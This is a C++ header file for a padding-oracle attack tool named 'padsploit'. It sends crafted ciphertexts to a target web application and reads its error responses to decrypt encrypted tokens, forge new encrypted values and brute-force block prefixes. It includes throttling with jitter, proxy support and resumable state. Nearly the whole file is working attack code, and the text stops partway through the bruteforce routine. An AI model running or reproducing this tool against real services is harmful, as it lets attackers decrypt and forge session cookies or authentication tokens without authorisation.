// padsploit.hpp
// Header-only CBC padding-oracle helper (decrypt | encrypt | bruteforce)
// Features: auto-discovery (encoding, block size), tri-state classification,
// optional timing-based detection, checkpointing, JSONL logs, throttling,
// retries/backoff (with visible "backing off" notices), block progress + ETA,
// simple ANSI TUI status line (optional), one-line end summary.
// Transport: libcurl only. License: MIT

#pragma once
#include <algorithm>
#include <atomic>
#include <chrono>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <functional>
#include <iomanip>
#include <iostream>
#include <map>
#include <mutex>
#include <random>
#include <regex>
#include <sstream>
#include <string>
#include <thread>
#include <vector>
#include <cmath>        // backoff pow()

#if !defined(_WIN32)
  #include <strings.h>  // strncasecmp on POSIX
  #include <unistd.h>   // isatty
#else
  #include <io.h>       // _isatty, _fileno
#endif

#include <curl/curl.h>

namespace padsploit {

// ---------- tiny utils ----------
inline std::string trim(const std::string &s){
    size_t b=s.find_first_not_of(" \t\r\n"); if(b==std::string::npos) return "";
    size_t e=s.find_last_not_of(" \t\r\n");  return s.substr(b,e-b+1);
}
inline std::string to_lower(std::string s){
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c){ return std::tolower(c); });
    return s;
}
inline void msleep(int ms){ if(ms>0) std::this_thread::sleep_for(std::chrono::milliseconds(ms)); }

// color (optional)
inline bool stdout_is_tty(){
#if defined(_WIN32)
    return _isatty(_fileno(stdout)) != 0;
#else
    return ::isatty(fileno(stdout)) != 0;
#endif
}
struct Ansi {
    bool on = stdout_is_tty();
    const char* reset() const { return on ? "\033[0m" : ""; }
    const char* red()   const { return on ? "\033[31m" : ""; }
    const char* yel()   const { return on ? "\033[33m" : ""; }
    const char* grn()   const { return on ? "\033[32m" : ""; }
    const char* dim()   const { return on ? "\033[2m"  : ""; }
};

// ---- Simple TUI (no deps, ANSI only) ----
struct Tui {
    bool enabled=false;
    bool colored=false;
    const char* dim=""; const char* grn=""; const char* yel=""; const char* red=""; const char* rst="";
    char spinner[4] = {'|','/','-','\\'};
    int spin_idx = 0;

    void init(bool on, bool want_color){
        enabled = on;
        colored = on && want_color;
        if (colored){
            dim = "\033[2m"; grn = "\033[32m"; yel = "\033[33m"; red = "\033[31m"; rst = "\033[0m";
        }
    }
    // Render one line (carriage-return; no scroll)
    void line(const char* phase,
              int block, int blocks,
              int byteIdx1, int blockSize,
              int guessesTried, int totalReq,
              double avgMs, double etaSec)
    {
        if(!enabled) return;
        char spin = spinner[spin_idx++ & 3];
        std::ostringstream o;
        o << "\r" << (colored?dim:"") << spin << (colored?rst:"")
          << " " << phase;
        if(block>0 && blocks>=0) o << "  blk " << block << "/" << blocks;
        if(blockSize>0 && byteIdx1>0) o << "  byte " << byteIdx1 << "/" << blockSize;
        if(guessesTried>=0) o << "  guess " << guessesTried << "/256";
        o << "  req " << totalReq
          << "  avg " << std::fixed << std::setprecision(1) << avgMs << "ms"
          << "  ETA ~" << std::setprecision(1) << etaSec << "s   ";
        std::cout << o.str() << std::flush;
    }
    void note(const std::string& s, const char* color=""){
        if(!enabled){ std::cout << s << "\n"; return; }
        std::cout << "\r" << (colored?color:"") << s << (colored?rst:"")
                  << std::string(20,' ') << "\n" << std::flush;
    }
    void finish(){
        if(!enabled) return;
        std::cout << "\r" << std::string(140, ' ') << "\r" << std::flush;
    }
};

// hex
inline std::string hex_encode(const std::string &in, bool upper=false){
    static const char *L="0123456789abcdef", *U="0123456789ABCDEF"; const char *H=upper?U:L;
    std::string o; o.reserve(in.size()*2);
    for (unsigned char c: in){ o.push_back(H[(c>>4)&0xF]); o.push_back(H[c&0xF]); }
    return o;
}
inline std::string hex_decode(std::string s){
    s = to_lower(s);
    if (s.size()%2) throw std::runtime_error("hex length must be even");
    auto hv=[](char c)->int{ if('0'<=c&&c<='9')return c-'0'; if('a'<=c&&c<='f')return 10+(c-'a'); return -1; };
    std::string o; o.reserve(s.size()/2);
    for(size_t i=0;i<s.size();i+=2){ int hi=hv(s[i]), lo=hv(s[i+1]); if(hi<0||lo<0) throw std::runtime_error("bad hex"); o.push_back((char)((hi<<4)|lo)); }
    return o;
}

// base64 + websafe + .NET UrlToken
inline const std::string B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
inline std::string b64_encode(const std::string &in){
    std::string o; size_t i=0;
    while(i+3<=in.size()){
        unsigned n=(unsigned char)in[i]<<16|(unsigned char)in[i+1]<<8|(unsigned char)in[i+2];
        o.push_back(B64[(n>>18)&63]); o.push_back(B64[(n>>12)&63]); o.push_back(B64[(n>>6)&63]); o.push_back(B64[n&63]); i+=3;
    }
    if(i+1==in.size()){ unsigned n=((unsigned char)in[i])<<16; o.push_back(B64[(n>>18)&63]); o.push_back(B64[(n>>12)&63]); o+="=="; }
    else if(i+2==in.size()){ unsigned n=((unsigned char)in[i]<<16)|((unsigned char)in[i+1]<<8);
        o.push_back(B64[(n>>18)&63]); o.push_back(B64[(n>>12)&63]); o.push_back(B64[(n>>6)&63]); o.push_back('='); }
    return o;
}
inline int b64_idx(char c){
    if('A'<=c&&c<='Z')return c-'A'; if('a'<=c&&c<='z')return 26+(c-'a');
    if('0'<=c&&c<='9')return 52+(c-'0'); if(c=='+')return 62; if(c=='/')return 63; return -1;
}
inline std::string b64_decode(const std::string &inRaw){
    std::string in; in.reserve(inRaw.size()); for(char c: inRaw) if(c!='\r'&&c!='\n') in.push_back(c);
    if(in.size()%4) throw std::runtime_error("invalid b64 length");
    std::string o; o.reserve(in.size()/4*3);
    for(size_t i=0;i<in.size();i+=4){
        int a=in[i]=='='?-2:b64_idx(in[i]); int b=in[i+1]=='='?-2:b64_idx(in[i+1]);
        int c=in[i+2]=='='?-2:b64_idx(in[i+2]); int d=in[i+3]=='='?-2:b64_idx(in[i+3]);
        if(a<0||b<0||(c<-1)||(d<-1)) throw std::runtime_error("invalid b64 chars");
        unsigned n=(a<<18)|(b<<12)|((c<0?0:c)<<6)|(d<0?0:d);
        o.push_back((n>>16)&0xFF); if(in[i+2]!='=') o.push_back((n>>8)&0xFF); if(in[i+3]!='=') o.push_back(n&0xFF);
    }
    return o;
}
inline std::string web64_encode(const std::string &in, bool netToken){
    std::string s = b64_encode(in);
    for(char &c: s){ if(c=='+') c='-'; else if(c=='/') c='_'; }
    int pad=0; while(!s.empty()&&s.back()=='='){ s.pop_back(); pad++; }
    if(netToken) s+=std::to_string(pad);
    return s;
}
inline std::string web64_decode(std::string s, bool netToken){
    int pad=0;
    if(netToken){
        if(s.empty()||!isdigit((unsigned char)s.back())) throw std::runtime_error(".NET UrlToken missing pad count");
        pad=s.back()-'0'; s.pop_back();
    }
    for(char &c: s){ if(c=='-') c='+'; else if(c=='_') c='/'; }
    while(pad-- > 0) s.push_back('=');
    while(!netToken && (s.size()%4)) s.push_back('=');
    return b64_decode(s);
}

enum EncodingFmt { ENC_B64=0, ENC_HEX_LOWER=1, ENC_HEX_UPPER=2, ENC_DOTNET_URLTOKEN=3, ENC_WEBSAFE_B64=4 };

inline std::string encode_bytes(const std::string &bytes, int fmt){
    switch(fmt){
        case ENC_B64: return b64_encode(bytes);
        case ENC_HEX_LOWER: return hex_encode(bytes,false);
        case ENC_HEX_UPPER: return hex_encode(bytes,true);
        case ENC_DOTNET_URLTOKEN: return web64_encode(bytes,true);
        case ENC_WEBSAFE_B64: return web64_encode(bytes,false);
        default: throw std::runtime_error("bad encoding fmt");
    }
}
inline std::string decode_text(const std::string &text, int fmt){
    switch(fmt){
        case ENC_B64: return b64_decode(text);
        case ENC_HEX_LOWER: case ENC_HEX_UPPER: return hex_decode(text);
        case ENC_DOTNET_URLTOKEN: return web64_decode(text,true);
        case ENC_WEBSAFE_B64: return web64_decode(text,false);
        default: throw std::runtime_error("bad encoding fmt");
    }
}
inline std::string regex_escape(const std::string &s){
    static const std::regex re(R"([.^$|()\\[*+?{\]])");
    return std::regex_replace(s, re, R"(\$&)");
}
inline std::string json_escape(const std::string &s){
    std::ostringstream o; o<<'"';
    for(char c: s){
        switch(c){
            case '"': o<<"\\\""; break; case '\\': o<<"\\\\"; break;
            case '\b': o<<"\\b"; break; case '\f': o<<"\\f"; break;
            case '\n': o<<"\\n"; break; case '\r': o<<"\\r"; break; case '\t': o<<"\\t"; break;
            default: if((unsigned char)c<0x20){ o<<"\\u"<<std::hex<<std::setw(4)<<std::setfill('0')<<(int)(unsigned char)c<<std::dec; } else o<<c;
        }
    }
    o<<'"'; return o.str();
}

// ---------- HTTP ----------
struct HttpResp {
    long status=0;
    std::string body;
    std::string location="N/A";
    size_t content_length=0;
    double ttfb_ms=0.0;
};

inline size_t write_cb(char *ptr, size_t sz, size_t nm, void *ud){
    auto *s = reinterpret_cast<std::string*>(ud); s->append(ptr, sz*nm); return sz*nm;
}

// portable case-insensitive prefix compare for "Location:"
inline bool is_location_prefix(const char* s){
#if defined(_WIN32)
    return _strnicmp(s, "Location:", 9) == 0;
#else
    return strncasecmp(s, "Location:", 9) == 0;
#endif
}

inline size_t header_cb(char *buf, size_t size, size_t nitems, void *ud){
    size_t total = size*nitems; std::string line(buf, total);
    auto *loc = reinterpret_cast<std::string*>(ud);
    if (line.size()>=9 && is_location_prefix(line.c_str())) *loc = trim(line.substr(9));
    return total;
}

struct Throttle {
    double rps=0.0; int delay_ms=0, jitter_ms=0;
    std::mt19937 rng{std::random_device{}()}; std::uniform_int_distribution<int> j{0,0};
    std::chrono::steady_clock::time_point nextAllowed = std::chrono::steady_clock::now();
    void configure(double r, int d, int jj){ rps=r; delay_ms=d; jitter_ms=jj; j=std::uniform_int_distribution<int>(0, std::max(0,jitter_ms)); }
    void wait(){
        int extra=j(rng);
        if (rps>0.0){
            auto now=std::chrono::steady_clock::now();
            auto slot=std::chrono::duration<double>(1.0/rps);
            if (now<nextAllowed) std::this_thread::sleep_until(nextAllowed);
            nextAllowed=std::chrono::steady_clock::now()+std::chrono::duration_cast<std::chrono::steady_clock::duration>(slot);
            msleep(extra);
        } else if (delay_ms>0||extra>0){ msleep(delay_ms+extra); }
    }
};

struct HttpClient {
    CURL *curl=nullptr;
    std::string proxy, proxyauth, auth_basic;
    std::vector<std::pair<std::string,std::string>> headers;
    int max_retries=3, backoff_ms=250; double backoff_mult=2.0;
    bool veryverbose=false;
    Throttle throttle;

    // stats
    uint64_t request_count=0;
    double   total_time_ms=0.0;

    HttpClient(){ curl_global_init(CURL_GLOBAL_DEFAULT); curl = curl_easy_init(); }
    ~HttpClient(){ if(curl) curl_easy_cleanup(curl); curl_global_cleanup(); }
    void set_headers_kv(const std::string &spec){
        std::stringstream ss(spec); std::string tok;
        while(getline(ss, tok, ';')){
            auto p = tok.find("::"); if(p!=std::string::npos) headers.emplace_back(trim(tok.substr(0,p)), trim(tok.substr(p+2)));
        }
    }
    HttpResp request(const std::string &method, const std::string &url, const std::string &data, const std::string &cookie){
        struct curl_slist *hdrs=nullptr; auto cleanup=[&](){ if(hdrs) curl_slist_free_all(hdrs); hdrs=nullptr; };
        for(int attempt=0; attempt<=max_retries; ++attempt){
            throttle.wait();
            curl_easy_reset(curl);
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
            curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
            std::string body, location;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &body);
            curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, header_cb);
            curl_easy_setopt(curl, CURLOPT_HEADERDATA, &location);

            if(!cookie.empty()){ std::string ck="Cookie: "+cookie; hdrs=curl_slist_append(hdrs, ck.c_str()); }
            for(auto &kv: headers){ std::string line=kv.first + ": " + kv.second; hdrs=curl_slist_append(hdrs, line.c_str()); }
            if (method=="POST" || method=="PUT"){
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
                hdrs=curl_slist_append(hdrs, "Content-Type: application/x-www-form-urlencoded");
            }
            if(hdrs) curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
            if(!auth_basic.empty()){ curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC); curl_easy_setopt(curl, CURLOPT_USERPWD, auth_basic.c_str()); }
            if(!proxy.empty()){
                curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
                if(!proxyauth.empty()){ curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_ANY); curl_easy_setopt(curl, CURLOPT_PROXYUSERPWD, proxyauth.c_str()); }
            }
            if(veryverbose){ std::cerr<<"Request:\n"<<method<<"\n"<<url<<"\n"<<data<<"\n"<<cookie<<"\n"; }

            auto t0=std::chrono::steady_clock::now();
            CURLcode rc = curl_easy_perform(curl);
            auto t1=std::chrono::steady_clock::now();
            double ms = std::chrono::duration<double,std::milli>(t1-t0).count();

            long code=0; if(rc==CURLE_OK) curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
            HttpResp r; r.status=(rc==CURLE_OK)?code:0; r.body=std::move(body); r.location=location.empty()?"N/A":location; r.content_length=r.body.size(); r.ttfb_ms=ms;

            // stats
            request_count++; total_time_ms += ms;

            cleanup();

            bool retry=false;
            if(rc!=CURLE_OK) retry=true;
            else if(r.status==429 || r.status==503 || r.status==504) { retry=true; std::cerr<<"[http] backing off (server said "<<r.status<<")\n"; }

            if(!retry || attempt==max_retries) return r;
            int waitms = (int)(backoff_ms * std::pow(backoff_mult, attempt));
            msleep(waitms);
        }
        HttpResp r; return r;
    }
};

// ---------- config & state ----------
enum Mode { M_DECRYPT, M_ENCRYPT, M_BRUTEFORCE };
enum RespClass { RC_UNKNOWN=0, RC_VALID=1, RC_APPERR=2, RC_PADERR=3 };

struct Options {
    // required
    std::string url, sample; int blockSize=0;

    // mode
    Mode mode = M_DECRYPT;

    // http
    std::string post, headers, cookie, auth, proxy, proxyauth;

    // encoding
    int encoding=ENC_B64; bool noencode=false; bool noiv=false; std::string prefix;

    // classification
    bool useBody=false, triAnalyze=false, timing=false, autodiscover=false;
    std::string re_pad, re_app, re_valid; // body regexes
    std::string error; // legacy "padding error"

    // pacing + retries
    double rps=0.0; int delay_ms=0, jitter_ms=0, concurrency=1;
    int max_retries=3, backoff_ms=250; double backoff_mult=2.0;

    // progress/logs
    bool verbose=false, veryverbose=false, logDir=false;
    std::string jsonl_path, state_path;
    int resumeBlock = 0;   // resume decrypt at this 1-based block

    // TUI
    bool tui=false;
    bool no_color=false;

    // encrypt inputs
    std::string plaintext, encodedtext, cipher_hex, interm_hex;
};

struct LoggerDir {
    bool enabled=false; std::string dir;
    void init(bool on){
        enabled=on; if(!enabled) return;
        time_t t=time(nullptr); tm lt{}; 
#if defined(_WIN32)
        localtime_s(&lt,&t);
#else
        localtime_r(&t,&lt);
#endif
        static const char*mon[]={"JAN","FEB","MAR","APR","MAY","JUN","JUL","AUG","SEP","OCT","NOV","DEC"};
        char buf[64]; std::snprintf(buf,sizeof(buf),"PadBuster.%02d%s%02d-%02d%02d%02d", lt.tm_mday, mon[lt.tm_mon], (lt.tm_year%100), lt.tm_hour, lt.tm_min, lt.tm_sec);
        dir=buf; std::filesystem::create_directories(dir);
    }
    void write(const std::string &name, const std::string &content){
        if(!enabled) return; std::ofstream f(dir + "/" + name, std::ios::app | std::ios::binary); if(!f) return; f<<content;
    }
};

struct Jsonl {
    std::ofstream out;
    void open(const std::string &p){ out.open(p, std::ios::app); }
    void write(const std::string &line){ if(out){ out<<line<<"\n"; out.flush(); } }
};

inline std::string curl_escape(CURL *c, const std::string &in){
    char *enc = curl_easy_escape(c, in.c_str(), (int)in.size());
    if(!enc) return std::string(); std::string out(enc); curl_free(enc); return out;
}

inline void save_state(const Options &opt, int blockIndex1, const std::string &intermHex){
    if(opt.state_path.empty()) return;
    std::ofstream f(opt.state_path, std::ios::trunc);
    if(!f) return;
    f << "{\n"
      << "  \"url\": " << json_escape(opt.url) << ",\n"
      << "  \"blockSize\": " << opt.blockSize << ",\n"
      << "  \"encoding\": " << opt.encoding << ",\n"
      << "  \"resumeBlock\": " << blockIndex1 << ",\n"
      << "  \"intermediateHex\": " << json_escape(intermHex) << "\n"
      << "}\n";
}

// ---------- classifier ----------
struct SignatureKey {
    long status; size_t len; std::string location; std::string body; double ttfb_ms;
    bool operator<(SignatureKey const& o) const{
        if(status!=o.status) return status<o.status;
        if(len!=o.len) return len<o.len;
        if(location!=o.location) return location<o.location;
        if(body!=o.body) return body<o.body;
        return ttfb_ms<o.ttfb_ms;
    }
};
inline uint32_t body_checksum(const std::string &s){ uint32_t sum=1; for(char c: s) sum=(sum+(unsigned char)c)%65521; return sum; }
struct Classifier {
    std::unique_ptr<std::regex> padRe, appRe, validRe;
    bool useBody=false, timing=false;
    std::map<SignatureKey, RespClass> manual;
    SignatureKey keyOf(const HttpResp &r) const {
        SignatureKey k{r.status, r.content_length, r.location, "", timing?r.ttfb_ms:0.0};
        if(useBody) k.body=r.body; return k;
    }
    RespClass classify(const HttpResp &r) const{
        const std::string &hay = useBody? r.body : r.location;
        if(padRe && std::regex_search(hay,*padRe)) return RC_PADERR;
        if(appRe && std::regex_search(hay,*appRe)) return RC_APPERR;
        if(validRe && std::regex_search(hay,*validRe)) return RC_VALID;
        auto it=manual.find(keyOf(r)); if(it!=manual.end()) return it->second;
        return RC_UNKNOWN;
    }
};

// ---------- autodiscovery ----------
struct Discovery { int encoding=-1; int blockSize=0; };
inline bool looks_b64(const std::string &s){ return s.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=_-.") == std::string::npos; }
inline bool looks_hex(const std::string &s){ return s.find_first_not_of("0123456789abcdefABCDEF") == std::string::npos; }
inline Discovery autodiscover(const Options &opt){
    Discovery d{};
    std::vector<int> cands;
    if (looks_b64(opt.sample)) cands={0,4,3};
    else if (looks_hex(opt.sample)) cands={1,2};
    else cands={0,4,3,1,2};
    for(int e: cands){ try{ (void)decode_text(opt.sample,e); d.encoding=e; break; } catch(...){} }
    if(d.encoding<0) d.encoding=0;
    try{
        std::string raw=decode_text(opt.sample,d.encoding);
        if (raw.size()%16==0) d.blockSize=16;
        else if (raw.size()%8==0) d.blockSize=8;
        else d.blockSize=16;
    } catch(...){ d.blockSize=16; }
    return d;
}

// ---------- request templating ----------
inline bool replace_once(std::string &target, const std::string &needle_regex_escaped, const std::string &replacement){
    std::regex re(needle_regex_escaped); std::smatch m;
    if(std::regex_search(target, m, re)){ target.replace(m.position(), m.length(), replacement); return true; }
    return false;
}
inline void prep_request(std::string url, std::string post, std::string cookie,
                         const std::string &needle_re, const std::string &payload,
                         std::string &out_url, std::string &out_post, std::string &out_cookie)
{
    bool found=false; out_url=url; out_post=post; out_cookie=cookie;
    if(replace_once(out_url, needle_re, payload)) found=true;
    if(!post.empty()   && replace_once(out_post,   needle_re, payload)) found=true;
    if(!cookie.empty() && replace_once(out_cookie, needle_re, payload)) found=true;
    if(!found) throw std::runtime_error("encrypted sample not found in URL/POST/Cookies");
}

// ---------- core engine (exposed via class API) ----------
class Engine {
public:
    LoggerDir logdir;
    Jsonl jsonl;
    bool primerPrinted=false; // show once
    Tui  tui;

    static RespClass classify_oracle(const Classifier &clf, const HttpResp &r, const std::string &oracleSig, bool useBody){
        RespClass rc = clf.classify(r);
        if (rc != RC_UNKNOWN) return rc;
        if (!oracleSig.empty()){
            std::stringstream ss; ss<<r.status<<"\t"<<r.content_length<<"\t"<<r.location; if(useBody) ss<<"\t"<<r.body;
            if (ss.str() != oracleSig) return RC_APPERR;
            return RC_PADERR;
        }
        return RC_UNKNOWN;
    }

    std::string process_block(const Options &opt, HttpClient &http, CURL *esc,
                              const std::string &needle_re,
                              const std::string &Ci, int B,
                              Classifier &clf, bool &analysisDone,
                              std::string &oracleSig, int blockIndex1,
                              int totalBlocks)   // added total for TUI
    {
        std::string testBytes(B,'\0'), interm(B,'\0');
        std::map<std::string,int> sigFreq; std::map<std::string,std::string> sigDump;
        Ansi c;

        auto time_block_start = std::chrono::steady_clock::now();
        uint64_t reqs_at_start = http.request_count;

        for(int j=B-1;j>=0;--j){
            bool hit=false;
            for(int guess=255; guess>=0; --guess){
                // TUI tick
                if (opt.tui){
                    int tried = 256 - guess;
                    double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
                    double eta = (guess+1) * avg / 1000.0;
                    tui.line("decrypt", blockIndex1, totalBlocks, j+1, B, tried, (int)http.request_count, avg, eta);
                } else if ((guess % 64)==63 && opt.verbose){
                    double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
                    int tried = 256 - guess;
                    double eta = avg * (double)(guess+1) / 1000.0;
                    std::cout << "[progress] block " << blockIndex1 << " byte " << (j+1) << "/" << B
                              << " guesses " << tried << "/256, est " << std::fixed << std::setprecision(2)
                              << eta << "s\n";
                }

                testBytes[j]=(char)guess;
                std::string payload_raw = testBytes + Ci;
                if(!opt.prefix.empty()) payload_raw = decode_text(opt.prefix,opt.encoding) + payload_raw;
                std::string payload = encode_bytes(payload_raw, opt.encoding);
                if(!opt.noencode) payload = curl_escape(esc, payload);

                std::string u,p,cookies; prep_request(opt.url,opt.post,opt.cookie,needle_re,payload,u,p,cookies);
                auto r=http.request(opt.post.empty()?"GET":"POST",u,p,cookies);

                if(!opt.jsonl_path.empty()){
                    std::ostringstream jl; jl<<"{\"type\":\"attempt\",\"phase\":\"decrypt\",\"block\":"<<blockIndex1
                        <<",\"byte\":"<<(j+1)<<",\"guess\":"<<guess<<",\"status\":"<<r.status<<",\"len\":"<<r.content_length
                        <<",\"ttfb_ms\":"<<std::fixed<<std::setprecision(3)<<r.ttfb_ms<<"}";
                    jsonl.write(jl.str());
                }

                std::stringstream sig; sig<<r.status<<"\t"<<r.content_length<<"\t"<<r.location; if(opt.useBody) sig<<"\t"<<r.body;

                if(!analysisDone && opt.triAnalyze && !clf.padRe && !clf.appRe && !clf.validRe){
                    if(!primerPrinted){
                        std::cout<<c.dim()<<"You’ll see several response signatures below. Pick which one is "
                                 <<"Padding Error, App Error, and Valid. Press 0 to skip a class."<<c.reset()<<"\n";
                        primerPrinted=true;
                    }
                    sigFreq[sig.str()]++;
                    std::stringstream dump; dump<<"URL: "<<u<<"\nPost: "<<p<<"\nCookies: "<<cookies
                        <<"\n\nStatus: "<<r.status<<"\nLocation: "<<r.location<<"\nLen: "<<r.content_length<<"\nTTFBms: "<<r.ttfb_ms<<"\nContent:\n"<<r.body;
                    sigDump[sig.str()]=dump.str();
                    if(j==B-1 && guess==0){
                        std::vector<std::pair<std::string,int>> v(sigFreq.begin(), sigFreq.end());
                        std::sort(v.begin(), v.end(), [](auto&a,auto&b){return a.second<b.second;});
                        std::cout<<"Response signatures:\nID#\tFreq\tStatus\tLen\t"<<(opt.useBody?"Chk":"-")<<"\tLocation\n";
                        std::vector<std::string> order; int id=1;
                        for(auto &p1: v){
                            std::string S,L,LOC,BY; std::stringstream ss(p1.first);
                            std::getline(ss,S,'\t'); std::getline(ss,L,'\t'); std::getline(ss,LOC,'\t'); if(opt.useBody) std::getline(ss,BY,'\t');
                            std::cout<<id<<(id==(int)v.size()&&v.size()!=1?" **":"")<<"\t"<<p1.second<<"\t"<<S<<"\t"<<L<<"\t"<<(opt.useBody?std::to_string(body_checksum(BY)):"-")<<"\t"<<LOC<<"\n";
                            if(logdir.enabled) logdir.write("Sig_"+std::to_string(id)+".txt", sigDump[p1.first]);
                            order.push_back(p1.first); id++;
                        }
                        auto ask=[&](const char* label)->std::string{
                            std::cout<<"Select ID for "<<label<<" (0 for none): "; std::string line; std::getline(std::cin,line); int sel=0; try{sel=std::stoi(line);}catch(...){sel=0;}
                            if(sel>0 && sel<=(int)order.size()) return order[sel-1]; return "";
                        };
                        std::string padSel = ask("PADDING ERROR");
                        std::string appSel = ask("APP ERROR");
                        std::string valSel = ask("VALID");

                        auto parse=[&](const std::string &s)->SignatureKey{
                            std::stringstream ss(s); std::string S,L,LOC,BY;
                            std::getline(ss,S,'\t'); std::getline(ss,L,'\t'); std::getline(ss,LOC,'\t'); if(opt.useBody) std::getline(ss,BY,'\t');
                            SignatureKey k; k.status=std::stol(S); k.len=(size_t)std::stoul(L); k.location=LOC; if(opt.useBody) k.body=BY; k.ttfb_ms=0.0; return k;
                        };
                        if(!padSel.empty()) clf.manual[parse(padSel)]=RC_PADERR;
                        if(!appSel.empty()) clf.manual[parse(appSel)]=RC_APPERR;
                        if(!valSel.empty()) clf.manual[parse(valSel)]=RC_VALID;
                        oracleSig = padSel;

                        // Echo summary with colors
                        auto human=[&](const char* lbl, const std::string& sel, const char* color){
                            if(sel.empty()){ std::cout<<lbl<<": (none)\n"; return; }
                            std::string S,L,LOC,BY; std::stringstream ss(sel);
                            std::getline(ss,S,'\t'); std::getline(ss,L,'\t'); std::getline(ss,LOC,'\t'); if(opt.useBody) std::getline(ss,BY,'\t');
                            std::cout<<color<<lbl<<Ansi().reset()<<": status "<<S<<", len "<<L<<", loc "<<LOC<<"\n";
                        };
                        human("Padding Error", padSel, Ansi().red());
                        human("App Error",     appSel, Ansi().yel());
                        human("Valid",         valSel, Ansi().grn());

                        analysisDone=true; guess=256; continue;
                    }
                    continue;
                }

                RespClass rc = classify_oracle(clf, r, oracleSig, opt.useBody);
                bool success = (rc==RC_VALID || rc==RC_APPERR);
                if(opt.veryverbose){
                    std::cerr<<"[g="<<guess<<"] class="<<(rc==RC_PADERR?"PADERR":rc==RC_APPERR?"APPERR":rc==RC_VALID?"VALID":"UNK")
                             <<" status="<<r.status<<" len="<<r.content_length<<" ttfb="<<r.ttfb_ms<<"ms\n";
                }
                if(success){
                    unsigned char pad = (unsigned char)(B - j);
                    interm[j] = (char)(((unsigned char)testBytes[j]) ^ pad);
                    unsigned char nextPad = (unsigned char)(pad + 1);
                    for(int k=j;k<B;++k) testBytes[k]=(char)(((unsigned char)testBytes[k]^pad)^nextPad);
                    hit=true; break;
                }
                if(guess==0 && !hit){
                    std::cout<<"No match on [Byte "<<(j+1)<<"]. Restart block? [y/N]: ";
                    std::string ans; std::getline(std::cin, ans);
                    if(!ans.empty() && (ans[0]=='y'||ans[0]=='Y')){ j=B; std::fill(interm.begin(),interm.end(),0); std::fill(testBytes.begin(),testBytes.end(),0); }
                    else throw std::runtime_error("block failed");
                }
            }
            save_state(opt, blockIndex1, hex_encode(interm,true));
        }

        // block recap
        auto time_block_end = std::chrono::steady_clock::now();
        double sec = std::chrono::duration<double>(time_block_end - time_block_start).count();
        uint64_t used = http.request_count - reqs_at_start;
        tui.finish();
        std::cout << "[block] " << blockIndex1 << " done in " << used << " reqs (~" << std::fixed << std::setprecision(2) << sec << "s)\n";

        return interm;
    }

    // encrypt/forge (returns raw bytes)
    std::string forge(const Options &opt, HttpClient &http, CURL *esc, const std::string &needle_re,
                      const std::string &plaintextPadded, Classifier &clf, std::string &oracleSig)
    {
        const int B=opt.blockSize; if((int)plaintextPadded.size()%B) throw std::runtime_error("plaintext not aligned");
        int n=(int)plaintextPadded.size()/B;
        std::string forged; forged.reserve((n+1)*B);
        std::string seed=opt.cipher_hex.empty()? std::string(B,'\0') : hex_decode(opt.cipher_hex);
        if((int)seed.size()!=B) throw std::runtime_error("--ciphertext-hex must be one block");
        std::string interm_last = opt.interm_hex.empty()? std::string() : hex_decode(opt.interm_hex);
        if(!opt.interm_hex.empty() && (int)interm_last.size()!=B) throw std::runtime_error("--intermediate-hex must be one block");

        bool analysisDone=(bool)(clf.padRe||clf.appRe||clf.validRe)||!oracleSig.empty();
        auto derive=[&](const std::string &Ci, int blockIndex1)->std::string{
            bool done=analysisDone;
            return process_block(opt,http,esc,needle_re,Ci,B,clf,done,oracleSig,blockIndex1,n);
        };

        std::string prev=seed;
        for(int b=n;b>=1;--b){
            std::string P=plaintextPadded.substr((b-1)*B,B);
            // TUI status for encrypt phase
            if (opt.tui){
                double avg = http.request_count ? (http.total_time_ms / (double)http.request_count) : 0.0;
                tui.line("encrypt", (n-b+1), n, 0, B, -1, (int)http.request_count, avg, 0.0); // <-- fixed: use member tui
            }
            std::string I = (b==n && !interm_last.empty()) ? interm_last : derive(std::string(B,'\0'), (n-b+1));
            std::string Cprev(B,'\0');
            for(int i=0;i<B;i++) Cprev[i]=(char)(((unsigned char)I[i]) ^ ((unsigned char)P[i]));
            forged.insert(forged.begin(), Cprev.begin(), Cprev.end());
            if(opt.verbose) std::cout<<"[encrypt] block "<<b<<" interm="<<hex_encode(I,true)<<" Cprev="<<hex_encode(Cprev,true)<<"\n";
            prev=Cprev;
            tui.finish();
        }
        forged += std::string(B,'\0');
        return forged;
    }

    // bruteforce helper (2-byte front probe)
    void bruteforce(const Options &opt, HttpClient &http, CURL *esc, const std::string &needle_re, Classifier &clf, std::string &oracleSig){
        const int B=opt.blockSize; std::cout<<"Bruteforce scan (2-byte prefix)\n";
        std::atomic<size_t> idx{0}; std::atomic<uint64_t> hits{0};
        auto worker=[&](){
            for(;;){
                size_t i=idx.fetch_add(1); if(i>=65536) break;
                int a=(int)(i/256), b=(int)(i%256);
                std::string t(B,'\0'); t[0]=(char)a; t[1]=(char)b;
                std::string payload = encode_bytes(t + std::string(B,'\0'), opt.encoding);
                if(!opt.noencode) payload = curl_escape(esc, payload);
